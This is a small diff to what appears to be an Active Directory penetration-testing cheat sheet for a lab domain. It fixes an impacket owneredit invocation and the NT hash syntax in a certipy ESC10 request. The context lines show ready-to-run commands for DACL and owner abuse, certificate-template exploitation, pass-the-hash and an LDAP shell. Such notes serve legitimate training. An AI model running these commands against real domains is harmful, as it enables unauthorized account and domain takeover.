@@ -1411,7 +1411,7 @@ Add-DomainGroupMember -Identity MicrosoftSync -Members remote_svc$ -Verbose
 
 WriteOwner
 ```bash
-python3 examples/owneredit.py -action write -new-owner own_user -target target_user -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1
+impacket-owneredit -action write -new-owner own_user -target target_user -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1
 
 python3 examples/dacledit.py -principal own_user -target target_user -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action write
 ```
@@ -1809,7 +1809,7 @@ certipy auth -pfx administrator.pfx -dc-ip <dc-ip> -debug
 
 # ESC 10
 certipy account update -u 'user' -p 'Password' -user own_user -upn 'lab-dc$@lab.local' -dc-ip 10.129.228.236
-certipy req -u 'own_user' -hashes ee22ddf0f8a66db4217050e6a948f9d6 -ca CA_Name -template User -dc-ip 10.129.228.236
+certipy req -u 'own_user' -hashes :ee22ddf0f8a66db4217050e6a948f9d6 -ca CA_Name -template User -dc-ip 10.129.228.236
 certipy account update -u 'user' -p 'Password' -user own_user -upn 'user2@lab.local' -dc-ip 10.129.228.236
 ## ldap_shell for RBCD
 certipy auth -pfx lab-dc.pfx -dc-ip 10.129.228.236 -ldap-shell
